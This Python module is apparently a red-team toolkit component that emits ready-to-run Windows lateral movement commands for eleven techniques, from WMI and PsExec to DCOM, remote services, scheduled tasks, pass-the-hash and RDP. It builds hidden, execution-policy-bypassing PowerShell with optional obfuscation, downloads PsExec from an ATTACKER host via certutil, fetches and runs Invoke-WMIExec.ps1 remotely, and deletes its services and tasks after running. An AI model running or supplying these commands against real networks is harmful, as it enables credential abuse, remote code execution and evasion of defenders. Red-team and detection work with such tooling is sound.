"""
Lateral movement template generator.
Returns ready-to-run commands for moving laterally across Windows environments.
For use in authorized red team exercises only.
"""
import random
import string
from dataclasses import dataclass

from .obfuscate import ps_tick_marks

SUPPORTED_TECHNIQUES = (
    "wmi_exec",
    "wmi_exec_cmd",
    "psremoting",
    "psexec",
    "dcom_mmc",
    "smb_svc",
    "schtask_remote",
    "pass_the_hash_wmi",
    "winrm_ps",
    "evil_winrm",
    "xfreerdp_cmd",
)


@dataclass
class LateralResult:
    command: str
    technique: str
    notes: str


def _rand_name(length: int = 6) -> str:
    return "".join(random.choices(string.ascii_lowercase, k=length))


def _nt_only(hash_nt: str) -> str:
    return hash_nt.split(":")[-1] if ":" in hash_nt else hash_nt


# ── Techniques ────────────────────────────────────────────────────────────────

def _wmi_exec(target: str, command: str, username: str, password: str, hash_nt: str, obfuscate: bool) -> LateralResult:
    cmd = (
        f"$p='{password}';"
        f"$s=ConvertTo-SecureString $p -AsPlainText -Force;"
        f"$c=New-Object System.Management.Automation.PSCredential('{username}',$s);"
        f"Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList '{command}' -ComputerName {target} -Credential $c"
    )
    if obfuscate:
        cmd = ps_tick_marks(cmd)
    return LateralResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{cmd}\"",
        technique="wmi_exec",
        notes="Requires WMI port 135 open. No output returned — use a callback or write to a file share.",
    )


def _wmi_exec_cmd(target: str, command: str, username: str, password: str, hash_nt: str, obfuscate: bool) -> LateralResult:
    cmd = f'wmic.exe /node:"{target}" /user:"{username}" /password:"{password}" process call create "{command}"'
    return LateralResult(
        command=cmd,
        technique="wmi_exec_cmd",
        notes="Legacy but widely supported. May trigger AV on wmic.exe usage.",
    )


def _psremoting(target: str, command: str, username: str, password: str, hash_nt: str, obfuscate: bool) -> LateralResult:
    cmd = (
        f"$p='{password}';"
        f"$s=ConvertTo-SecureString $p -AsPlainText -Force;"
        f"$c=New-Object System.Management.Automation.PSCredential('{username}',$s);"
        f"Invoke-Command -ComputerName {target} -Credential $c -ScriptBlock {{{command}}}"
    )
    if obfuscate:
        cmd = ps_tick_marks(cmd)
    return LateralResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{cmd}\"",
        technique="psremoting",
        notes="Requires WinRM (5985/5986). Use -UseSSL for encrypted transport.",
    )


def _psexec(target: str, command: str, username: str, password: str, hash_nt: str, obfuscate: bool) -> LateralResult:
    tmp = r"C:\Windows\Temp\psx.exe"
    cmd = (
        f'certutil -urlcache -split -f https://ATTACKER/PsExec64.exe {tmp} && '
        f'{tmp} \\\\{target} -u {username} -p {password} -d -s CMD /c "{command}" && '
        f"del /f /q {tmp}"
    )
    return LateralResult(
        command=cmd,
        technique="psexec",
        notes=(
            "Replace ATTACKER. PsExec creates a named pipe service — high EDR visibility. "
            "Use -d for non-interactive, -s for SYSTEM."
        ),
    )


def _dcom_mmc(target: str, command: str, username: str, password: str, hash_nt: str, obfuscate: bool) -> LateralResult:
    # Auth comes from the calling process token — DCOM CreateInstance has no credential parameter.
    # To run as a different user, impersonate first with runas /netonly or Invoke-RunAs.
    cmd = (
        f"$d=[System.Activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application','{target}'));"
        f"$d.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,\"/c {command}\",'7')"
    )
    if obfuscate:
        cmd = ps_tick_marks(cmd)
    return LateralResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{cmd}\"",
        technique="dcom_mmc",
        notes="DCOM via MMC20.Application (port 135). Does not require SMB. No service creation artifact. Auth is from calling process token.",
    )


def _smb_svc(target: str, command: str, username: str, password: str, hash_nt: str, obfuscate: bool) -> LateralResult:
    svcname = _rand_name(6)
    cmd = (
        f'sc.exe \\\\{target} create {svcname} binPath= "cmd.exe /c {command}" && '
        f"sc.exe \\\\{target} start {svcname} && "
        f"ping -n 3 127.0.0.1 && "
        f"sc.exe \\\\{target} delete {svcname}"
    )
    return LateralResult(
        command=cmd,
        technique="smb_svc",
        notes="Requires admin share access (445). Service start is fire-and-forget — no output. Artifacts: service creation event (7045).",
    )


def _schtask_remote(target: str, command: str, username: str, password: str, hash_nt: str, obfuscate: bool) -> LateralResult:
    taskname = _rand_name(8)
    cmd = (
        f'schtasks /Create /S {target} /U {username} /P {password} /TN {taskname} /TR "cmd.exe /c {command}" /SC ONCE /ST 00:00 /F && '
        f"schtasks /Run /S {target} /U {username} /P {password} /TN {taskname} && "
        f"ping -n 3 127.0.0.1 && "
        f"schtasks /Delete /S {target} /U {username} /P {password} /TN {taskname} /F"
    )
    return LateralResult(
        command=cmd,
        technique="schtask_remote",
        notes="Creates, runs, then deletes the task. Artifacts: task scheduler event (4698).",
    )


def _pass_the_hash_wmi(target: str, command: str, username: str, password: str, hash_nt: str, obfuscate: bool) -> LateralResult:
    cmd = (
        f"IEX (New-Object Net.WebClient).DownloadString('https://ATTACKER/Invoke-WMIExec.ps1');"
        f"Invoke-WMIExec -Target {target} -Username {username} -Hash {_nt_only(hash_nt)} -Command \"{command}\""
    )
    if obfuscate:
        cmd = ps_tick_marks(cmd)
    return LateralResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{cmd}\"",
        technique="pass_the_hash_wmi",
        notes=(
            "Requires Invoke-WMIExec.ps1 staged at ATTACKER (from Kevin Robertson's WMIExec). "
            "Hash format: 32-char hex NT hash only (no LM prefix needed). NTLM auth bypasses Kerberos."
        ),
    )


def _winrm_ps(target: str, command: str, username: str, password: str, hash_nt: str, obfuscate: bool) -> LateralResult:
    cmd = (
        f"$p='{password}';"
        f"$s=ConvertTo-SecureString $p -AsPlainText -Force;"
        f"$c=New-Object System.Management.Automation.PSCredential('{username}',$s);"
        f"$sess=New-PSSession -ComputerName {target} -Credential $c -Authentication Negotiate;"
        f"Invoke-Command -Session $sess -ScriptBlock {{{command}}};"
        f"Remove-PSSession $sess"
    )
    if obfuscate:
        cmd = ps_tick_marks(cmd)
    return LateralResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{cmd}\"",
        technique="winrm_ps",
        notes="Requires WinRM (5985/5986). -Authentication Negotiate supports NTLM fallback.",
    )


def _evil_winrm(target: str, command: str, username: str, password: str, hash_nt: str, obfuscate: bool) -> LateralResult:
    # Strip domain prefix for evil-winrm — it expects bare username
    bare_user = username.split("\\")[-1] if "\\" in username else username
    if hash_nt:
        cmd = f"evil-winrm -i {target} -u {bare_user} -H {_nt_only(hash_nt)}"
    else:
        cmd = f"evil-winrm -i {target} -u {bare_user} -p {password}"
    return LateralResult(
        command=cmd,
        technique="evil_winrm",
        notes="Linux tool. Install: gem install evil-winrm. Provides interactive PS shell. Supports PTH, Kerberos, SSL.",
    )


def _xfreerdp_cmd(target: str, command: str, username: str, password: str, hash_nt: str, obfuscate: bool) -> LateralResult:
    bare_user = username.split("\\")[-1] if "\\" in username else username
    if hash_nt:
        auth = f"/pth:{_nt_only(hash_nt)}"
    else:
        auth = f"/p:{password}"
    cmd = f"xfreerdp /v:{target} /u:{bare_user} {auth} /cert-ignore /dynamic-resolution /drive:share,/tmp +clipboard"
    return LateralResult(
        command=cmd,
        technique="xfreerdp_cmd",
        notes="Linux tool. RDP lateral movement (port 3389). /drive mounts /tmp as a share for file transfer. Restricted Admin mode required for PTH (/pth).",
    )


# ── Public API ─────────────────────────────────────────────────────────────────

_DISPATCH = {
    "wmi_exec": _wmi_exec,
    "wmi_exec_cmd": _wmi_exec_cmd,
    "psremoting": _psremoting,
    "psexec": _psexec,
    "dcom_mmc": _dcom_mmc,
    "smb_svc": _smb_svc,
    "schtask_remote": _schtask_remote,
    "pass_the_hash_wmi": _pass_the_hash_wmi,
    "winrm_ps": _winrm_ps,
    "evil_winrm": _evil_winrm,
    "xfreerdp_cmd": _xfreerdp_cmd,
}


def generate_lateral(
    technique: str,
    target: str = "TARGET_HOST",
    command: str = "whoami",
    username: str = "DOMAIN\\USER",
    password: str = "PASS",
    hash_nt: str = "",
    obfuscate: bool = True,
) -> LateralResult:
    if technique not in _DISPATCH:
        raise ValueError(f"Unknown technique '{technique}'. Supported: {', '.join(SUPPORTED_TECHNIQUES)}")
    return _DISPATCH[technique](target, command, username, password, hash_nt, obfuscate)
